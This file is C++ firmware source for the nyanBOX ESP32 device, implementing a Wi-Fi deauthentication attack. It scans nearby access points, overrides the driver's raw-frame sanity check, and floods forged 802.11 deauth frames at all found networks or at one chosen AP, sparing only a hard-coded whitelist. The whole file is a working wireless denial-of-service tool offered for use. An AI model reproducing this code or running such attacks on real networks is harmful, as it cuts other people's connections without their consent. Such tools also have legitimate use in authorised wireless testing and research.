/*
    nyanBOX by Nyan Devices
    https://github.com/jbohack/nyanBOX
    Copyright (c) 2025 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/deauth.h"
#include "../include/sleep_manager.h"
#include "../include/pindefs.h"
#include "../include/display_mirror.h"
#include "../include/setting.h"
#include "esp_wifi.h"
#include "esp_event.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

#define BTN_UP BUTTON_PIN_UP
#define BTN_DOWN BUTTON_PIN_DOWN
#define BTN_RIGHT BUTTON_PIN_RIGHT
#define BTN_BACK BUTTON_PIN_LEFT

// Function to bypass frame validation (required for raw 802.11 frames)
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

#define MAX_APS 20

enum Mode { MODE_MENU, MODE_ALL, MODE_LIST, MODE_DEAUTH_SINGLE, MODE_SCANNING };
static Mode currentMode = MODE_MENU;
static Mode returnMode = MODE_MENU;
static int menuSelection = 0;
static int apIndex = 0;

const unsigned long SCAN_INTERVAL = 30000;
const unsigned long DEAUTH_INTERVAL = 5;
const unsigned long SCAN_DURATION = 8000;
static unsigned long lastScanTime = 0;
static unsigned long lastDeauthTime = 0;
static unsigned long scanStartTime = 0;

static bool scanInProgress = false;
static uint16_t currentScanCount = 0;

static bool needsRedraw = true;
static Mode lastMode = MODE_MENU;
static int lastMenuSelection = -1;
static int lastApIndex = -1;
static int lastApCount = -1;
static uint16_t lastScanCount = 0;
static unsigned long lastScanUpdate = 0;
const unsigned long scanUpdateInterval = 100;

// Modified to whitelist network SSIDs
const char *ssidWhitelist[] = {
    "whitelistExample1", 
    "whitelistExample2"
};

const int whitelistCount = sizeof(ssidWhitelist) / sizeof(ssidWhitelist[0]);

inline bool isWhitelisted(const char *ssid) {
    for (int i = 0; i < whitelistCount; i++) {
        if (strcmp(ssid, ssidWhitelist[i]) == 0)
            return true;
    }
    return false;
}

struct AP_Info {
    char ssid[33];
    uint8_t bssid[6];
    int channel;
};

static AP_Info apList[MAX_APS];
static int apCount = 0;

static uint8_t deauthFrame[28] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0x00, 0x00, 0x01, 0x00};

void sendDeauth(const AP_Info &ap) {
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    memcpy(deauthFrame + 10, ap.bssid, 6);
    memcpy(deauthFrame + 16, ap.bssid, 6);
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        delay(1);
    }
}

void startScan() {
    if (scanInProgress) return;

    apCount = 0;
    currentScanCount = 0;
    scanInProgress = true;
    returnMode = currentMode;
    currentMode = MODE_SCANNING;
    needsRedraw = true;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    delay(100);
    
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
            .active = {
                .min = 120,
                .max = 200
            }
        }
    };
    
    esp_wifi_scan_start(&scan_config, false);
    scanStartTime = millis();
}

void processScanResults() {
    uint16_t number = 0;
    esp_wifi_scan_get_ap_num(&number);
    
    if (number > 0) {
        wifi_ap_record_t *ap_info = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
        
        if (ap_info != NULL) {
            memset(ap_info, 0, sizeof(wifi_ap_record_t) * number);
            
            uint16_t actual_number = number;
            esp_err_t err = esp_wifi_scan_get_ap_records(&actual_number, ap_info);
            
            if (err == ESP_OK) {
                apCount = 0;
                for (int i = 0; i < actual_number && apCount < MAX_APS; i++) {
                    // Skip hidden networks
                    if (ap_info[i].ssid[0] == '\0') continue;
                    
                    // Skip whitelisted networks
                    if (isWhitelisted((char*)ap_info[i].ssid)) continue;
                    
                    strncpy(apList[apCount].ssid, (char*)ap_info[i].ssid, sizeof(apList[apCount].ssid) - 1);
                    apList[apCount].ssid[sizeof(apList[apCount].ssid) - 1] = '\0';
                    memcpy(apList[apCount].bssid, ap_info[i].bssid, 6);
                    apList[apCount].channel = ap_info[i].primary;
                    apCount++;
                }
            }
            
            free(ap_info);
        }
    }
    
    esp_wifi_scan_stop();

    esp_wifi_set_promiscuous(true);

    scanInProgress = false;
    currentMode = returnMode;
    apIndex = 0;
    needsRedraw = true;
}

void drawScanning() {
    unsigned long now = millis();
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Scanning APs...");

    char countStr[32];
    snprintf(countStr, sizeof(countStr), "Found: %d networks", currentScanCount);
    u8g2.drawStr(0, 25, countStr);

    int barWidth = 120;
    int barHeight = 10;
    int barX = 4;
    int barY = 35;
    u8g2.drawFrame(barX, barY, barWidth, barHeight);

    unsigned long elapsed = now - scanStartTime;
    int fillWidth = ((elapsed * (barWidth - 4)) / SCAN_DURATION);
    if (fillWidth > (barWidth - 4)) fillWidth = barWidth - 4;
    if (fillWidth > 0) {
        u8g2.drawBox(barX + 2, barY + 2, fillWidth, barHeight - 4);
    }

    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 60, "Press SEL to exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawMenu() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 12, "Deauth Mode:");
    u8g2.drawStr(0, 28, menuSelection == 0 ? "> All networks" : "  All networks");
    u8g2.drawStr(0, 44, menuSelection == 1 ? "> Single AP" : "  Single AP");
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "U/D=Move R=OK SEL=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawAll() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 12, "Deauthing all APs");

    char buf[32];
    snprintf(buf, sizeof(buf), "Networks: %d", apCount);
    u8g2.drawStr(0, 28, buf);

    if (apCount > 0) {
        char channels[64] = "Ch: ";
        bool channelUsed[15] = {false};

        for (int i = 0; i < apCount; i++) {
            int ch = apList[i].channel;
            if (ch >= 1 && ch <= 14) {
                channelUsed[ch] = true;
            }
        }

        bool first = true;
        for (int i = 1; i <= 14; i++) {
            if (channelUsed[i]) {
                if (!first) strcat(channels, ", ");
                char chStr[4];
                snprintf(chStr, sizeof(chStr), "%d", i);
                strcat(channels, chStr);
                first = false;
            }
        }

        u8g2.drawStr(0, 44, channels);
    }

    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "L=Back SEL=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 12, "Select AP to deauth");
    if (apCount > 0) {
        char line1[32];
        char maskedSSID[33];
        maskName(apList[apIndex].ssid, maskedSSID, sizeof(maskedSSID) - 1);
        snprintf(line1, sizeof(line1), "%s  Ch:%d", maskedSSID,
                 apList[apIndex].channel);
        u8g2.drawStr(0, 28, line1);
        char line2[24];
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 apList[apIndex].bssid[0], apList[apIndex].bssid[1],
                 apList[apIndex].bssid[2], apList[apIndex].bssid[3],
                 apList[apIndex].bssid[4], apList[apIndex].bssid[5]);
        char maskedBSSID[18];
        maskMAC(bssidStr, maskedBSSID);
        u8g2.drawStr(0, 44, maskedBSSID);
    } else {
        u8g2.drawStr(0, 30, "No APs found");
    }
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "U/D=Scroll R=Start L=Back");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawDeauthSingle() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 12, "Deauthing Selected AP");
    char buf[32];
    char maskedSSID[33];
    maskName(apList[apIndex].ssid, maskedSSID, sizeof(maskedSSID) - 1);
    snprintf(buf, sizeof(buf), "%s  Ch:%d", maskedSSID,
             apList[apIndex].channel);
    u8g2.drawStr(0, 28, buf);
    char mac[24];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             apList[apIndex].bssid[0], apList[apIndex].bssid[1],
             apList[apIndex].bssid[2], apList[apIndex].bssid[3],
             apList[apIndex].bssid[4], apList[apIndex].bssid[5]);
    char maskedMAC[18];
    maskMAC(mac, maskedMAC);
    u8g2.drawStr(0, 44, maskedMAC);
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "L=Stop & Back SEL=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void deauthSetup() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();

    esp_wifi_set_promiscuous(true);
    
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);

    currentMode = MODE_MENU;
    menuSelection = 0;
    apIndex = 0;
    apCount = 0;
    lastScanTime = 0;
    lastDeauthTime = 0;
    scanInProgress = false;

    needsRedraw = true;
    lastMode = MODE_MENU;
    lastMenuSelection = -1;
    lastApIndex = -1;
    lastApCount = -1;
    lastScanCount = 0;
    lastScanUpdate = 0;

    startScan();
    lastScanTime = millis();
}

void deauthLoop() {
    unsigned long now = millis();

    if (currentMode == MODE_SCANNING) {
        esp_wifi_scan_get_ap_num(&currentScanCount);

        if (currentScanCount != lastScanCount) {
            lastScanCount = currentScanCount;
            needsRedraw = true;
        }
        if (now - lastScanUpdate >= scanUpdateInterval) {
            lastScanUpdate = now;
            needsRedraw = true;
        }

        if (needsRedraw) {
            drawScanning();
            needsRedraw = false;
        }

        if (now - scanStartTime > SCAN_DURATION) {
            processScanResults();
            lastScanTime = now;
        }
        return;
    }

    if (now - lastScanTime >= SCAN_INTERVAL &&
        currentMode != MODE_DEAUTH_SINGLE && !scanInProgress) {
        startScan();
        lastScanTime = now;
        return;
    }

    bool up = digitalRead(BTN_UP) == LOW;
    bool down = digitalRead(BTN_DOWN) == LOW;
    bool left = digitalRead(BTN_BACK) == LOW;
    bool right = digitalRead(BTN_RIGHT) == LOW;

    switch (currentMode) {
    case MODE_MENU:
        if (up || down) {
            menuSelection ^= 1;
            needsRedraw = true;
            delay(200);
        }
        if (right) {
            currentMode = (menuSelection == 0 ? MODE_ALL : MODE_LIST);
            needsRedraw = true;
            delay(200);
        }
        break;

    case MODE_ALL:
        if (left) {
            currentMode = MODE_MENU;
            needsRedraw = true;
            delay(200);
        }
        break;

    case MODE_LIST:
        if (up && apCount) {
            apIndex = (apIndex - 1 + apCount) % apCount;
            needsRedraw = true;
            delay(200);
        }
        if (down && apCount) {
            apIndex = (apIndex + 1) % apCount;
            needsRedraw = true;
            delay(200);
        }
        if (right && apCount) {
            currentMode = MODE_DEAUTH_SINGLE;
            needsRedraw = true;
            delay(200);
        }
        if (left) {
            currentMode = MODE_MENU;
            needsRedraw = true;
            delay(200);
        }
        break;

    case MODE_DEAUTH_SINGLE:
        if (left) {
            currentMode = MODE_LIST;
            needsRedraw = true;
            delay(200);
        }
        break;

    case MODE_SCANNING:
        break;
    }

    if (currentMode != lastMode) {
        lastMode = currentMode;
        needsRedraw = true;
    }

    if (menuSelection != lastMenuSelection) {
        lastMenuSelection = menuSelection;
        needsRedraw = true;
    }

    if (apIndex != lastApIndex &&
        (currentMode == MODE_LIST || currentMode == MODE_DEAUTH_SINGLE)) {
        lastApIndex = apIndex;
        needsRedraw = true;
    }

    if (apCount != lastApCount) {
        lastApCount = apCount;
        needsRedraw = true;
    }

    if (needsRedraw) {
        switch (currentMode) {
        case MODE_MENU:
            drawMenu();
            break;
        case MODE_ALL:
            drawAll();
            break;
        case MODE_LIST:
            drawList();
            break;
        case MODE_DEAUTH_SINGLE:
            drawDeauthSingle();
            break;
        case MODE_SCANNING:
            break;
        }
        needsRedraw = false;
    }

    if (now - lastDeauthTime >= DEAUTH_INTERVAL && apCount) {
        lastDeauthTime = now;
        if (currentMode == MODE_ALL) {
            sendDeauth(apList[apIndex]);
            apIndex = (apIndex + 1) % apCount;
            lastApIndex = apIndex;
        } else if (currentMode == MODE_DEAUTH_SINGLE) {
            sendDeauth(apList[apIndex]);
        }
    }
}